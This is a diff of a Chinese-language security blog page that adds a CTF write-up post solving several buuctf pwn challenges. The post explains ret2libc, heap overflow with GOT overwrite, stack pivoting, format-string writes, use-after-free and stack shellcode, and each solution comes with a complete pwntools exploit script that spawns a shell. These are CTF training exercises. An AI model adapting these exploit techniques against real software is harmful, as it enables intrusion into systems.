@@ -150,6 +150,150 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
+    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/buuctf-pwn-write-ups-7/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="CoLin">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="CoLin's BLOG">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/02/28/buuctf-pwn-write-ups-7/" class="post-title-link" itemprop="url">buuctf-pwn write-ups (7)</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-02-28 22:10:00" itemprop="dateCreated datePublished" datetime="2023-02-28T22:10:00+08:00">2023-02-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-03-01 11:31:05" itemprop="dateModified" datetime="2023-03-01T11:31:05+08:00">2023-03-01</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/write-ups/" itemprop="url" rel="index"><span itemprop="name">write-ups</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/write-ups/buuctf-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">buuctf 系列</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">Symbols count in article: </span>
+              <span>8k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">Reading time &asymp;</span>
+              <span>7 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="buu054-jarvisoj_level1"><a class="markdownIt-Anchor" href="#buu054-jarvisoj_level1"></a> buu054-jarvisoj_level1</h1>
+<p>又是那个jarvisoj特有的“肠梗阻”问题，远程的消息不发点东西过去它是不会过来的，这题本来是在栈中写shellcode然后返回到栈上执行，但是也可以用ret2Libc。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26705</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io.sendline(cyclic(<span class="number">0x88</span>+<span class="number">4</span>) + p32(elf.plt[<span class="string">&#x27;write&#x27;</span>]) + p32(elf.symbols[<span class="string">&#x27;main&#x27;</span>]) + p32(<span class="number">1</span>) + p32(elf.got[<span class="string">&#x27;printf&#x27;</span>]) + p32(<span class="number">4</span>))</span><br><span class="line">printf = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;printf&#x27;</span>, printf)</span><br><span class="line">base = printf - libc.dump(<span class="string">&#x27;printf&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">binsh = base + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">io.sendline(cyclic(<span class="number">0x88</span>+<span class="number">4</span>) + p32(sys) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="buu055-babyfengshui_33c3_2016"><a class="markdownIt-Anchor" href="#buu055-babyfengshui_33c3_2016"></a> buu055-babyfengshui_33c3_2016</h1>
+<p>一道考察堆排布的题目，一共可以添加最多50个用户，每一个用户的信息用两个chunk来保存。第一个chunk保存description，大小可以自由选择，第二个chunk保存第一个chunk的地址加用户名，大小固定为0x80（可写大小）。<br />
+<img src="1.png" alt="" /><br />
+需要重点关注一下选项0添加用户中用于读取姓名的函数中的一个检查。<br />
+<img src="2.png" alt="" /><br />
+这个地方检查的是两个堆地址的大小关系。那这个检查到底检查的是什么呢？<br />
+ptr存放50个user_info指针，那么&amp;ptr+index应该就是要写入用户名的user_info的地址，查阅汇编代码发现后面的name[120]不明所以，故调试才是最好的理解方式。调试发现，这里实际上检查的是：一个user_info中desc的输入长度是否超限。它的比较方式是：首先输入desc的长度（这里实际上是重复输入，前面已经输入过一次长度，desc的chunk已经分配），然后程序比较&quot;desc+长度&quot;这个地址是否超过了user_info的地址。由于desc先于user_info分配，因此这样检查。如分配的desc可写头部地址为0x8049208，可写大小为0x80，user_info的可写头部地址为0x8049298，在写入desc的时候输入大小为0x40，那么这个检查比较的是0x8049208+0x40和0x804929c（user_info的size）的大小。<br />
+如此看来，绕过这个检查的思路就很清晰了。我们想办法让这两个chunk分配的距离远一点，中间还有其他的chunk，而且desc分配在user_info的低地址位置。这样的话我们就可以通过写入desc来覆盖某些chunk。<br />
+如下图就是一个简洁的利用思路。<br />
+<img src="3.png" alt="" /><br />
+通过堆溢出将user_info #3中的desc指针替换成.got表地址，获取到free函数地址后计算system地址，再写回到got表中，调用free函数即可执行system(‘/bin/sh’)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29858</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, desclen, desc, name</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>, <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;size of description: &#x27;</span>, <span class="built_in">str</span>(size).encode())</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;name: &#x27;</span>, name)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;text length: &#x27;</span>, <span class="built_in">str</span>(desclen).encode())</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;text: &#x27;</span>, desc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">	</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">index, desclen, desc</span>):</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;Action: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">	io.sendlineafter(<span class="string">b&#x27;text length: &#x27;</span>, <span class="built_in">str</span>(desclen).encode())</span><br><span class="line">	io.sendafter(<span class="string">b&#x27;text: &#x27;</span>, desc)</span><br><span class="line">	</span><br><span class="line">add(<span class="number">0x20</span>, <span class="number">0x20</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>, <span class="string">b&#x27;colin&#x27;</span>)	<span class="comment"># user #0</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="number">0x20</span>, <span class="string">b&#x27;colin&#x27;</span>, <span class="string">b&#x27;colin&#x27;</span>)		<span class="comment"># user #1</span></span><br><span class="line">add(<span class="number">0x20</span>, <span class="number">0x20</span>, <span class="string">b&#x27;colin&#x27;</span>, <span class="string">b&#x27;colin&#x27;</span>)		<span class="comment"># user #2</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">payload = cyclic(<span class="number">0x80</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)		<span class="comment"># prev size of user_#2.desc</span></span><br><span class="line">payload += p32(<span class="number">0x29</span>)	<span class="comment"># size of user_#2.desc</span></span><br><span class="line">payload += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x20</span></span><br><span class="line">payload += p32(<span class="number">0</span>)		<span class="comment"># prev size of user_#2.userinfo</span></span><br><span class="line">payload += p32(<span class="number">0x89</span>)	<span class="comment"># size of user_#2.userinfo</span></span><br><span class="line">payload += p32(elf.got[<span class="string">&#x27;free&#x27;</span>])	<span class="comment"># change the desc pointer to .plt.got</span></span><br><span class="line">add(<span class="number">0x80</span>, <span class="number">0x100</span>, payload, <span class="string">b&#x27;colin&#x27;</span>)	<span class="comment"># user #3, desc chunk = userinfo #1</span></span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;description: &#x27;</span>)</span><br><span class="line">free = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(free))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;free&#x27;</span>, free)</span><br><span class="line">base = free - libc.dump(<span class="string">&#x27;free&#x27;</span>)</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">update(<span class="number">2</span>, <span class="number">4</span>, p32(sys))</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="buu056-ciscn_2019_s_4"><a class="markdownIt-Anchor" href="#buu056-ciscn_2019_s_4"></a> buu056-ciscn_2019_s_4</h1>
+<p>这题的vuln函数里面有两个输入，第一个输入我们通过printf套出来ebp的地址，可以计算得到我们输入的字符串的地址，之后第二个输入将ebp修改到字符串里面，返回到一个函数内部，在没有push ebp的前提下，leave指令会首先进行mov esp, ebp操作，将esp强制上抬到我们的字符串中间，将system地址写到字符串中即可getshell。注意字符串’/bin/sh’要写到system地址高地址处，防止system函数内部覆盖字符串。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28199</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io.sendline(cyclic(<span class="number">40</span>-<span class="number">1</span>))</span><br><span class="line">io.recvuntil(<span class="string">&#x27;Hello, &#x27;</span>)</span><br><span class="line">io.recv(<span class="number">40</span>)</span><br><span class="line">ebp = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(ebp))</span><br><span class="line">buf_addr = ebp - <span class="number">0x38</span></span><br><span class="line">payload = p32(elf.plt[<span class="string">&#x27;system&#x27;</span>])        <span class="comment"># offset: 0x0</span></span><br><span class="line">payload += p32(elf.symbols[<span class="string">&#x27;main&#x27;</span>])     <span class="comment"># offset: 0x4</span></span><br><span class="line">payload += p32(buf_addr + <span class="number">0xC</span>)          <span class="comment"># offset: 0x8</span></span><br><span class="line">payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span>               <span class="comment"># offset: 0xC</span></span><br><span class="line">payload += cyclic(<span class="number">0x14</span>)                 <span class="comment"># 0ffset: 0x14</span></span><br><span class="line">payload += p32(buf_addr - <span class="number">4</span>)            <span class="comment"># ebp</span></span><br><span class="line">payload += p32(<span class="number">0x8048562</span>)               <span class="comment"># ret addr: leave; ret</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="buu057-hitcontraining_magicheap"><a class="markdownIt-Anchor" href="#buu057-hitcontraining_magicheap"></a> buu057-hitcontraining_magicheap</h1>
+<p>和第39题完全相同，除了magic和heaparray的地址少了0x20。略过。</p>
+<h1 id="buu058-axb_2019_fmt32"><a class="markdownIt-Anchor" href="#buu058-axb_2019_fmt32"></a> buu058-axb_2019_fmt32</h1>
+<p>格式化字符串题。首先通过调试找到格式化字符串的偏移：<br />
+<img src="4.png" alt="" /><br />
+使用格式化字符串泄露got表地址，然后使用fmtstr_payload函数构造payload，将printf函数的got表地址改成system。（下面的代码有一定概率通不过，不知道是什么原因）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">29861</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please tell me:&#x27;</span>, <span class="string">b&#x27;a%9$s&#x27;</span> + p32(elf.got[<span class="string">&#x27;alarm&#x27;</span>]))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Repeater:a&#x27;</span>)</span><br><span class="line">alarm = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(alarm))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;alarm&#x27;</span>, alarm)</span><br><span class="line">base = alarm - libc.dump(<span class="string">&#x27;alarm&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(base))</span><br><span class="line">sys = base + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(sys))</span><br><span class="line">payload = <span class="string">b&#x27;|| deadbeef||&#x27;</span></span><br><span class="line">payload += fmtstr_payload(<span class="number">11</span>, &#123;elf.got[<span class="string">&#x27;printf&#x27;</span>]: sys&#125;, numbwritten=<span class="number">22</span>)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line">io.sendlineafter(<span class="string">b&#x27;Please tell me:&#x27;</span>, payload)</span><br><span class="line">io.sendline(<span class="string">b&#x27;|| /bin/sh&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="buu059-ciscn_2019_n_3"><a class="markdownIt-Anchor" href="#buu059-ciscn_2019_n_3"></a> buu059-ciscn_2019_n_3</h1>
+<p>经过对源程序的分析，可以得到本题中使用的数据结构如下：<br />
+<img src="5.png" alt="" /><br />
+records全局变量是chunk_info*的数组。其中可以存放整型或字符串。<br />
+在两个释放内存的函数中都没有将全局变量中的对应指针删除，可能会导致UAF。<br />
+由于打印内容使用的是chunk_info中的函数指针，因此修改这个函数指针可以有任意代码执行。<br />
+此处利用UAF修改函数指针，修改free函数指针到system，修改print函数指针为字符串’sh\x00\x00’，这样在删除的时候就可以执行&quot;system(‘sh’)&quot;。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index, <span class="built_in">type</span>, content, length=<span class="number">0</span></span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;CNote &gt; &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Index &gt; &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Type &gt; &#x27;</span>, <span class="built_in">str</span>(<span class="built_in">type</span>).encode())</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">type</span> == <span class="number">2</span>:</span><br><span class="line">        io.sendlineafter(<span class="string">b&#x27;Length &gt; &#x27;</span>, <span class="built_in">str</span>(length).encode())</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Value &gt; &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;CNote &gt; &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Index &gt; &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;CNote &gt; &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Index &gt; &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">2</span>, <span class="string">b&#x27;/bin/sh&#x27;</span>, <span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">1</span>, <span class="string">b&#x27;123456&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">2</span>, <span class="string">b&#x27;sh\x00\x00&#x27;</span> + p32(elf.plt[<span class="string">&#x27;system&#x27;</span>]), <span class="number">0xc</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<h1 id="buu060-wustctf2020_closed"><a class="markdownIt-Anchor" href="#buu060-wustctf2020_closed"></a> buu060-wustctf2020_closed</h1>
+<p>这道题实际上是要我们理解linux标准输入输出。开启一个终端之后，对于这个终端来说有标准输入（文件描述符为0）、标准输出（1）和标准错误输出（2）三个标准IO流。这三个流的文件描述符指向的是一个地方，也就是开启的控制台。理解这道题题解<code>exec 1&gt;&amp;0</code>的关键是将控制台程序本身看成是一个文件，这个文件可以通过我们的键盘输入内容，也可以进行输出，输出的内容可以被我们看见，但输出本身仍然在这个文件中。程序关闭了标准输出和标准错误输出，但是输入没有关闭，三个文件描述符原本指向的都是这个控制台程序，那么现在我们只需要让标准输入重新指向控制台就可以了，也就是指向标准输入指向的地方。</p>
+<p>如下图所示，这个控制台程序是pycharm内部的控制台，其标准输入、输出、错误输出都指向/dev/pts/2。那么<code>exec 1&gt;&amp;0</code>实际上就等同于<code>exec 1&gt;/dev/pts/2</code>。<br />
+<img src="6.png" alt="" /><br />
+我们首先使用<code>exec 1&gt;&amp;0</code>打开输出流，查看一下标准输入流指向的位置，发现是<code>/dev/pts/2</code><br />
+<img src="7.png" alt="" /><br />
+因此，下面的输入也可以打开输出流：<code>exec 1&gt;/dev/pts/2</code>（本地可以，远程不行因为没有file命令）<br />
+<img src="8.png" alt="" /></p>
+<h1 id="buu061-pwnable_start"><a class="markdownIt-Anchor" href="#buu061-pwnable_start"></a> buu061-pwnable_start</h1>
+<p>这道题源程序非常简单，应该是用汇编写的，就两个函数。进行了两次系统调用，一次输出一次输入，栈可执行。</p>
+<p>观察到输入的长度大于输出，可以通过返回到输出syscall上方的代码，跳过对输出长度<code>mov dl, 14h</code>的修改，而直接执行后面的<code>mov bl,1; mov al,4</code>，可以实现输出0x3C个字节的数据，以此来获取栈的地址。</p>
+<p>打印出栈地址之后还可进行一次输出，可以将shellcode写入，然后执行shellcode即可。经过调试发现shellcode有44字节，写入shellcode之后正好就是返回地址的写入位置。但这里需要注意几点：</p>
+<ol>
+<li>不能直接将返回地址写到shellcode之后。虽然这样能够成功返回到shellcode，但是由于shellcode中有很多push指令，而shellcode在返回地址的低地址处，会导致shellcode的后面一部分被覆盖，无法正常执行。</li>
+<li>不能直接将shellcode写到返回地址后面，因为输入的长度最多只能为0x3C字节，在返回地址之后最多只能写入0xC个字节，长度不够。</li>
+</ol>
+<p>因此考虑在返回地址之后单独写一个跳转的小gadget：<code>sub esp, 0x100; jmp ecx</code>。注意执行到这里时ecx的值和调用输入系统调用的ecx值相等，因此jmp ecx能够直接执行shellcode。而<code>sub esp,0x100</code>则是强制让栈下移，防止shellcode被覆盖。如此，返回地址就应该写<code>sub esp,0x100</code>的地址。</p>
+<p><img src="9.png" alt="" /></p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">20</span>)</span><br><span class="line">payload += p32(<span class="number">0x804808B</span>)</span><br><span class="line"></span><br><span class="line">io.sendafter(<span class="string">b&#x27;Let\&#x27;s start the CTF:&#x27;</span>, payload)</span><br><span class="line">io.recvuntil(p32(<span class="number">0x804808b</span>))</span><br><span class="line">stack_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">payload = asm(shellcraft.sh())</span><br><span class="line">payload += p32(stack_addr + <span class="number">0x14</span>)</span><br><span class="line">payload += asm(<span class="string">&quot;sub esp, 0x100;&quot;</span></span><br><span class="line">               <span class="string">&quot;jmp ecx;&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
     <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/buuctf-pwn-write-ups-6/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1350,243 +1494,10 @@ exp：</p>
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-cn">
-    <link itemprop="mainEntityOfPage" href="http://hornos3.github.com/2023/02/28/ARM-pwn-%E5%85%A5%E9%97%A8-1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="CoLin">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="CoLin's BLOG">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/02/28/ARM-pwn-%E5%85%A5%E9%97%A8-1/" class="post-title-link" itemprop="url">ARM pwn 入门 (1)</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-02-28 22:00:00" itemprop="dateCreated datePublished" datetime="2023-02-28T22:00:00+08:00">2023-02-28</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-03-01 11:30:18" itemprop="dateModified" datetime="2023-03-01T11:30:18+08:00">2023-03-01</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">学习笔记</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/ARM-pwn-%E7%B3%BB%E5%88%97/" itemprop="url" rel="index"><span itemprop="name">ARM pwn 系列</span></a>
-                </span>
-            </span>
-
-          <br>
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-                <span class="post-meta-item-text">Symbols count in article: </span>
-              <span>6.8k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-                <span class="post-meta-item-text">Reading time &asymp;</span>
-              <span>6 mins.</span>
-            </span>
